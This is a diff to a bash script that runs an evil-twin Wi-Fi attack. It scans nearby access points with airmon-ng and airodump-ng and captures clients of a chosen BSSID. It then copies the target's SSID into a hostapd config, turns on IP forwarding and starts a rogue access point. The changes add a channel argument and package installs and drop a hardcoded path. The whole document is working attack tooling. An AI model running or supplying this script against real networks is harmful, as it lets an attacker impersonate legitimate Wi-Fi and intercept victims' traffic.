@@ -2,14 +2,17 @@
 # Scan all AP around us
 interface="$1" #wlan0
 monitor_interface="$2" #wlan0mon
+channel="$3" #11
+
+sudo apt install dnsmasq -y
+sudo apt install gnome-terminal -y
+sudo apt install hostapd -y
 
 clear
 
 sudo airmon-ng stop $monitor_interface
 
 sudo airmon-ng check kill
-
-sudo systemctl restart NetworkManager
 
 sudo airmon-ng start $interface
 
@@ -51,7 +54,7 @@ echo "$finalMAC"
 
 sudo airmon-ng start $interface
 
-sudo timeout -s 2 40 airodump-ng -c 11 $monitor_interface --bssid $finalMAC -a -w device & sleep 41
+sudo timeout -s 2 40 airodump-ng -c $channel $monitor_interface --bssid $finalMAC -a -w device & sleep 41
 
 #Delete line 1 to 5 (useless lines, without data wanted)
 sed -i '1,5d' device-01.csv
@@ -74,13 +77,14 @@ do
 
 done < "device-01.csv"
 
+
+sudo systemctl restart NetworkManager
+
 # Creation of our AP
 sudo airmon-ng stop $monitor_interface
 
 sed -i "5s/.*/ssid="$finalName"/" hostconf.conf
 
-
-number=1
 
 #Turn sytem on forwarding mode
 sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
@@ -96,7 +100,7 @@ sudo ip addr add 192.168.1.1/24 dev $interface
 echo "ip add OK"
 
 #Execute hostapd on another terminal
-sudo gnome-terminal -- bash -c "sudo hostapd /home/mike/Documents/Secu/hostconf.conf ; exec bash"
+sudo gnome-terminal -- bash -c "sudo hostapd hostconf.conf ; exec bash"
 
 sudo rm scan-01.kismet.csv
 sudo rm scan-01.log.csv
